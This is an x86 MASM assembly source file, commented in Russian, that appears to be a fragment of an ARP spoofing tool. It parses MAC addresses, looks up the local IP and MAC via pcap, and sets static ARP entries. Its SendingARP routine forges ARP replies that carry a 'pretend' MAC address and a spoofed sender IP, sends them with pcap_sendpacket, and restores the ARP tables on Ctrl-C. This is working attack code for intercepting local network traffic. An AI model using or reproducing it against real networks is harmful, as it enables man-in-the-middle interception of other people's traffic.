.code
;===================================================================
;===================================================================
;===================================================================
; Функция show_error(param)
; Вход - param - указатель на строку для вывода
; Выход - форматированный вывод ошибки
;
show_error  proc param:DWORD
	invoke	StdOut, addr crlf 
	invoke	wsprintf,addr buff, addr szerror_template,param
	invoke	StdOut, addr buff  
	invoke	StdOut, addr crlf  
	ret
show_error  endp

;===================================================================
;===================================================================
;===================================================================
; Функция show_help
; Вход - NULL 
; Выход - вывод инфо. об использовании проги
;
show_help  proc 
	invoke	StdOut, addr crlf 
	invoke	StdOut, addr szhelper
	invoke	StdOut, addr szhelper1	
	invoke	StdOut, addr crlf  
	ret
show_help endp
;===================================================================
;===================================================================
;===================================================================
.data
	; Шаблон для генерации строки случайного MAC адреса
	;abc	db 0ffh,0ffh,0ffh,0ffh,0ffh,0ffh	
	count	dd 0
.code
;===================================================================
;===================================================================
;===================================================================
; Функция StrToDWORD(param)
; Вход - param - указатель на строку MAC -адреса вида "xx:xx:xx:xx:xx:xx"
; Выход - по адресу [param] будет находиться строка "xxh xxh xxh xxh xxh xxh"
;
StrToDWORD  proc param:DWORD 
local	out_data[128]:BYTE
	invoke	GetSegCount, param, ":"	
	.if	eax != 6
		; Show error "Bad MAC"
		ret
	.endif

	xor	ecx,ecx
	mov	count,eax
	lea	edi, buff	

	.while	ecx != count
  		inc	ecx
		push	ecx
		push	edi
		invoke	GetSegStr, param, ecx, ":", ADDR out_data
		invoke	HexStrToDWORD, addr out_data
		pop	edi
		mov	byte ptr [edi],al
		ror	eax,8
		mov	byte ptr [edi+1],al
		inc	edi
		pop	ecx
	.endw
	
	lea	eax,buff
	ret
StrToDWORD  endp
;===================================================================
;===================================================================
;===================================================================
; Функция HexStrToDWORD(param)
; Вход - param - указатель на строку вида "xx"
; Выход - по адресу [param] будет находиться ворд "xxh"
;
; Взял у DEEP/wasm.ru с http://www.wasm.ru/forum/viewtopic.php?id=28399
HexStrToDWORD proc _s:DWORD
	xor	eax, eax
	mov	ecx, _s
	cmp	byte ptr [ecx], 0
	je	@exit
	;ADD ECX, 2; <---- Пропускаем "0х"
	movzx	edx, byte ptr [ecx]

@loop:	shl	eax, 4;
	lea	eax, [eax+edx+10-"A"]
	cmp	edx, "9"
	jg	@skip
	add	eax, "A"-"9"-1
@skip:	add	ecx, 1
	movzx	edx, byte ptr [ecx];
	test	edx, edx
	jne	@loop
@exit:
	ret
HexStrToDWORD endp;
;===================================================================
;===================================================================
;===================================================================
.data
align 4
	; Шаблон вывода сообщения об отсылке ICMP-пакета 
	szformatSendICMP	db '	[+] ICMP packet did sending in time: %s',0
	szformatEr	db '[-]Error sending the packet: %s',13,10,0

	; Сообщение которое передается в ICMP пакете в 
	; том случае если пользователь не указал другое
	icmp_data_msg	db 'No pasaran!!!',0
	packet		dd  0
.data?

; Описание структур
ETHER_HEADER struct
	dmac	db 6 dup (?)
	smac	db 6 dup (?)
	type_	dw ?
ETHER_HEADER ends

IP_HEADER struct 
	ver_ihl		db ?  ; version / siz
	tos		db ? ; type of service 
	tlen		dw ? ; total length 
	identification	dw ? ; identification 
	flags_fo		dw ? ; fragment offset field 
	ttl		db ? ; time to live 
	proto_		db ? ; protocol 
	crc		dw ? ; checksum 
	saddr		db 4 dup (?) ; source  address
	daddr		db 4 dup (?) ; dest address 
IP_HEADER ends



ICMP_HEADER struct 
	icmp_type		db ?
	icmp_code		db ?
	icmp_cksum	dw ?
	icmp_id		dw ?
	icmp_seq		dw ?
	icmp_data		db 100 dup (?)
ICMP_HEADER ends


pEtherHeadr	ETHER_HEADER <>	
pIpHeader		IP_HEADER	<>
pIcmpHeader	ICMP_HEADER <>

.code
;===================================================================
;===================================================================
;===================================================================

;===================================================================
;===================================================================
;===================================================================
; Функция checksum (param1,param2)
; Вход -  param1 - указатель на строку для вывода
;	param2 - длина входной строки
; Выход - В EAX контрольная сумма строки 
; Взял тут http://www.wasm.ru/forum/viewtopic.php?id=24278
;
checksum     proc pData:dword, size_:dword
local cksum : DWORD
	mov	DWORD PTR [ebp-4], 0
L3:
	cmp	DWORD PTR [ebp+12], 1
	jle	L4
	mov	eax, DWORD PTR [ebp+8]
	movzx	edx, WORD PTR [eax]
	lea	eax, [ebp-4]
	add	DWORD PTR [eax], edx
	add	DWORD PTR [ebp+8], 2
	lea	eax, [ebp+12]
	sub	DWORD PTR [eax], 2
	jmp	L3
L4:
	cmp	DWORD PTR [ebp+12], 0
	je	L5
	mov	eax, DWORD PTR [ebp+8]
	movzx	edx, BYTE PTR [eax]
	lea	eax, [ebp-4]
	add	DWORD PTR [eax], edx
L5:
	mov	eax, DWORD PTR [ebp-4]
	mov	edx, eax
	shr	edx, 16
	movzx	eax, WORD PTR [ebp-4]
	lea	eax, [edx+eax]
	mov	DWORD PTR [ebp-4], eax
	mov	eax, DWORD PTR [ebp-4]
	mov	edx, eax
	shr	edx, 16
	lea	eax, [ebp-4]
	add	DWORD PTR [eax], edx
	mov	eax, DWORD PTR [ebp-4]
	not	eax
	movzx	eax, ax
	;leave
	ret
checksum      endp
;===================================================================
;===================================================================
;===================================================================

;-------------------------------------------------------------------
;pulMac	db   8


;-------------------------------------------------------------------
.const
	MAXLEN_PHYSADDR	equ 8
;-------------------------------------------------------------------
.data
align 4

MIB_IPFORWARDROW	struct 
	dwForwardDest	DWORD 0
	dwForwardMask	DWORD 0
	dwForwardPolicy	DWORD 0
	dwForwardNextHop	DWORD 0
	dwForwardIfIndex	DWORD 0
	dwForwardType	DWORD 0
	dwForwardProto	DWORD 0
	dwForwardAge	DWORD 0
	dwForwardNextHopAS	DWORD 0
	dwForwardMetric1	DWORD 0
	dwForwardMetric2	DWORD 0
	dwForwardMetric3	DWORD 0
	dwForwardMetric4	DWORD 0
	dwForwardMetric5	DWORD 0
MIB_IPFORWARDROW	ends

MIB_IPNETROW	struct
	dwIndex		DWORD 0
	dwPhysAddrLen	DWORD 0
	bPhysAddr		BYTE MAXLEN_PHYSADDR DUP(0)
	dwAddr		DWORD 0
	dwType		DWORD 0
MIB_IPNETROW	ends
;-------------------------------------------------------------------
.code
;===================================================================
;===================================================================
;===================================================================
; Функция StaticARP (param1,param2)
; Вход -  param1 - указатель на IP адрес хоста
;	param2 - указатель на строку из 6 байт = MAC адресу хоста с IP=param1 выше
; Выход - Устанавливается локальное соответствие IP - MAC
; Результат виден по комманде - "C:\arp -a" 
;
;
StaticARP  proc uses esi szIPAddr:DWORD, bPhysAddr:DWORD 
local ipfrow 	 :MIB_IPFORWARDROW
local iprow 	 :MIB_IPNETROW 
local dwIPAddr 	 :DWORD
	
	invoke	inet_addr, szIPAddr
	mov	dwIPAddr,eax
	lea	edi,ipfrow
	invoke	GetBestRoute, eax, INADDR_ANY, edi
	.if	eax != NO_ERROR
		ret -1
	.endif

	invoke	memset, addr iprow,0,sizeof iprow
	assume	esi:ptr MIB_IPFORWARDROW
	assume	edi:ptr MIB_IPNETROW
	lea	esi,ipfrow
	lea	edi,iprow
	push	[esi].dwForwardIfIndex
	pop	[edi].dwIndex
	mov	[edi].dwPhysAddrLen, 6

	push	6
	mov	eax,bPhysAddr
	push	eax
	lea	eax,[edi].bPhysAddr
	push	eax
	call	memcpy

	mov	eax, dwIPAddr	
	mov	[edi].dwAddr, eax
	mov	[edi].dwType, 4;	/* - static */

	invoke	CreateIpNetEntry, edi
	.if	eax!= NO_ERROR
		xor	eax,eax
		ret
	.endif
	mov	eax,-1
	ret


StaticARP  endp
;===================================================================
;===================================================================
;===================================================================
; Функция GetMAC (param1, param2)
; Вход -  param1 - указатель на IP адрес хоста
;	param2 - указатель на строку из 6 байт куда будет помещена строка из 6-ти байт
; Выход - Строка из 6 байт = MAC адресу по адресу param2
; 
;
GetMAC  proc uses edx szIPaddr:DWORD, ucMacAddr:DWORD 
local dwIpaddr:	DWORD
local ulLen:	DWORD

	invoke	inet_addr, szIPaddr
	mov	dwIpaddr, eax
	mov	ulLen, 6
	invoke	SendARP, dwIpaddr, 0, ucMacAddr, addr ulLen
	.if eax == NO_ERROR
		xor	eax,eax
		ret
	.else
		mov	eax,-1
		ret
	.endif

	ret
GetMAC  endp
;===================================================================
;===================================================================
;===================================================================
Print_MAC proc param1:DWORD
local	locbuff[256]:BYTE

jmp	_go
	szMacloc	db '%02X-%02X-%02X-%02X-%02X-%02X',0
	tab2	db '	',0
_go:

	mov	edx,param1	
	movzx   eax, byte ptr [edx+5]
	push    eax
	movzx   eax, byte ptr [edx+4]
	push    eax
	movzx   eax, byte ptr [edx+3]
	push    eax
	movzx   eax, byte ptr [edx+2]
	push    eax
	movzx   eax, byte ptr [edx+1]
	push    eax
	movzx   eax, byte ptr [edx+0]
	push    eax
	invoke	wsprintf, addr locbuff, addr szMacloc
	add	esp, 4*6
	invoke	StdOut, addr locbuff
	invoke	StdOut, addr tab2 	
	ret
Print_MAC endp
;===================================================================
;===================================================================
;===================================================================
GetLocalIP proc pStr:DWORD

	invoke	pcap_findalldevs,addr alldevs,addr errbuf
	add	esp, 4*2
	.if (eax == -1)
		invoke	StdOut, addr szErrpcap_findalldevs							
	.endif
	
	mov	eax,0
	assume	ecx:ptr pcap_if
	mov	ecx,alldevs
	assume	edx:ptr pcap_if
	mov	edx,alldevs

	.while	(eax != DevSelection)
		assume	edx:ptr pcap_if
		lea	edx,[ecx].next 
		mov	ecx,edx	
		inc	eax
	.endw



mov	ecx,edx
mov	edx, (pcap_if  ptr [ecx]).address
mov	eax, edx
mov	ecx, (pcap_addr_t ptr [edx+4]); .address
mov	edx, (sockaddr_in  ptr [ecx]).sin_addr
mov	ecx,edx
invoke    inet_ntoa,edx
mov	esi,eax

mov	edi,pStr
mov	ecx,16
rep	movsb

__exit_open:
	ret
GetLocalIP endp
;===================================================================
;===================================================================
;===================================================================
GetLocalMAC  proc ha:DWORD, pStr:DWORD
local pOidData: PACKET_OID_DATA
local pAddr[sizeof(PACKET_OID_DATA)+5]: BYTE

	invoke	RtlZeroMemory, addr pAddr,sizeof(PACKET_OID_DATA)+5
	assume	esi:ptr PACKET_OID_DATA
	lea	esi,pAddr
	mov	dword ptr [esi].Oid, OID_802_3_CURRENT_ADDRESS
	mov	dword ptr [esi].Lengthz,6
	mov	eax, ha

	invoke	PacketRequest,  dword ptr [eax], 0, esi
	add	esp,4*3

	lea	esi,pAddr
	add	esi,8

	mov	edi,pStr
	mov	ecx,6
	rep	movsb

	ret
GetLocalMAC endp
;===================================================================
;===================================================================
;===================================================================

.data
; Structures --
	arphdr struct
		arp_hwtype WORD ?
		arp_ptype  WORD ?
		arp_hwlen  BYTE ? 
		arp_plen   BYTE ?
		arp_opcode WORD ?
		arp_hwsource db 6 dup (?)
		arp_psource DWORD ?
		arp_hwdest   db 6 dup (?)
		arp_pdest	DWORD ?
	
	arphdr ends

	ether struct
		eth_dest db 6 dup (?)    
		eth_src  db 6 dup (?)    
		eth_type WORD ?
	ether ends

.const
	Size_	equ (Sizeof ether+Sizeof arphdr)
	ETHSIZE	equ (sizeof ether)
	ARPSIZE	equ (sizeof arphdr)

	ETHERTYPE_ARP	equ  806h
	ARPHRD_ETHER	equ  1	; /* Ethernet 10/100Mbps.*/
	ETHERTYPE_IP	equ  800h	; /* IP */
	ETHERLEN		equ  6
	PROTOLEN		equ  4
	ARPOP_REQUEST	equ  2	; /* 1-ARP request. 2-ARP reply.*/
	PCAP_ERRBUF_SIZE	equ 256
.code
;===================================================================
;===================================================================
;===================================================================
;
SendingARP proc harpspoof:DWORD  
local pBuffer:DWORD

	invoke	VirtualAlloc,0,Size_,MEM_COMMIT,PAGE_READWRITE
	mov	[pBuffer],eax
	assume	esi:ptr ARPSPOOF
	mov	esi,harpspoof

	mov	edi,eax
	lea	edi,(ether ptr [edi]).eth_dest
	lea	esi,(ARPSPOOF ptr [esi]).ucTargetMAC
	mov	ecx,ETHERLEN
	rep	movsb

	mov	edi,[pBuffer]
	mov	esi,harpspoof

	lea	edi,(ether ptr [edi]).eth_src
	lea	esi,(ARPSPOOF ptr [esi]).ucSelfMAC
	mov	ecx,ETHERLEN
	rep	movsb

	mov	edi,[pBuffer]
	invoke	htons,ETHERTYPE_ARP
	mov	(ether ptr [edi]).eth_type,ax
	
	mov	edi,[pBuffer]
	add	edi,ETHSIZE
	assume	edi:ptr arphdr
	
	invoke	htons,ARPHRD_ETHER
	mov	[edi].arp_hwtype,ax
	
	invoke	htons,ETHERTYPE_IP
	mov	[edi].arp_ptype,ax
	
	mov	[edi].arp_hwlen,ETHERLEN
	mov	[edi].arp_plen,PROTOLEN
	
	invoke	htons,ARPOP_REQUEST
	mov	[edi].arp_opcode,ax

	mov	esi,harpspoof
	lea	ecx,(ARPSPOOF ptr [esi]).szTarget

	invoke	inet_addr,ecx
	mov	[edi].arp_pdest,eax

	mov	esi,harpspoof
	lea	ecx,(ARPSPOOF ptr [esi]).szIP

	invoke	inet_addr,ecx
	mov	[edi].arp_psource,eax

	mov	esi,harpspoof
	lea	edi,[edi].arp_hwsource
	mov	ecx,ETHERLEN
	lea	esi,(ARPSPOOF ptr [esi]).ucPretendMAC
	rep	movsb
	

	mov	esi,harpspoof
	mov	edi,[pBuffer]
	add	edi,ETHSIZE
	lea	edi,[edi].arp_hwdest
	lea	esi,(ARPSPOOF ptr [esi]).ucTargetMAC
	mov	ecx,ETHERLEN
	rep	movsb
	assume	edi:nothing
	

	mov	esi,harpspoof
	push	Size_
	push	[pBuffer]
;int 3
	mov	eax,(ARPSPOOF ptr [esi]).hInterface
	push	eax
	call	pcap_sendpacket
	add	esp,4*3
	test	eax,eax
	jnz	Error_
	
	;invoke	_this_time
	;invoke	lstrcpy, addr temp,eax
	;invoke	wsprintf,	addr buffz, addr szformatSendARP,addr temp
	;invoke	StdOut, addr buffz		

Error_:	
	invoke	VirtualFree, [pBuffer],Size_,MEM_COMMIT 
		assume	esi:nothing
	ret
SendingARP  endp
;===================================================================
;===================================================================
;===================================================================
CtrlHandler	proc fdwCtrlType:DWORD 

	cmp dword ptr fdwCtrlType,CTRL_C_EVENT 
	je _reset
	cmp dword ptr fdwCtrlType,CTRL_CLOSE_EVENT
	je _reset
	cmp dword ptr fdwCtrlType,CTRL_BREAK_EVENT
	je _reset
	cmp dword ptr fdwCtrlType,CTRL_LOGOFF_EVENT
	je _reset
	cmp dword ptr fdwCtrlType,CTRL_SHUTDOWN_EVENT
	je _reset
	leave         
	jmp _default	; обработка по умолчанию      
_reset:	invoke	ResetSpoof
	xor	eax,eax
	invoke	ExitProcess,0
	;ret
_default:	xor	eax,eax
	mov	eax,-1
	invoke	ExitProcess,0
	;ret
CtrlHandler	endp
;===================================================================
;===================================================================
;===================================================================
